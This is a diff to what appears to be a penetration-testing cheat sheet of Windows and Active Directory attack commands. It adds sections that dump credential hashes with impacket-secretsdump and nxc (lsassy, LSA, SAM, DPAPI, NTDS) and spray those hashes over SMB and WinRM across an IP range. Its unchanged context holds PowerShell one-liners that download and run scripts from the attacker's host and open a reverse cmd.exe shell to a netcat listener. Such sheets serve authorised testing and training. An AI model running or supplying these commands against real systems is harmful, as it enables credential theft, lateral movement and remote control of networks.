@@ -1681,6 +1681,17 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/whoami')
 +---------- Full Privesc Scan ----------+
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 
++---------- Dump Hashes ----------+
+impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' -M lsassy
+nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator
+
++---------- Crack Hashes ----------+
+
++---------- Spray Hashes ----------+
+nxc smb 192.168.110.51-56 -u usernames -H hashes
+nxc winrm 192.168.110.51-56 -u usernames -H hashes
+
 +---------- Switch User: Known Creds ----------+
 rlwrap nc -lvnp 5566
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
